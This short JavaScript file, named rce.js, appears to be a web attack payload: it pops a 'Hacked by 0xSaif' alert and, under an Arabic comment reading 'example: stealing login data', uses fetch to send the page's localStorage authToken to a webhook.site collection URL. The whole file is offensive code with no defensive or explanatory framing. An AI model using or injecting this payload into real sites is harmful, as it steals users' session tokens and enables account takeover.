// rce.js
alert("Hacked by 0xSaif 👾");

// مثال: سرقة بيانات تسجيل الدخول
fetch("https://webhook.site/your-id?local=" + encodeURIComponent(localStorage.getItem("authToken")));
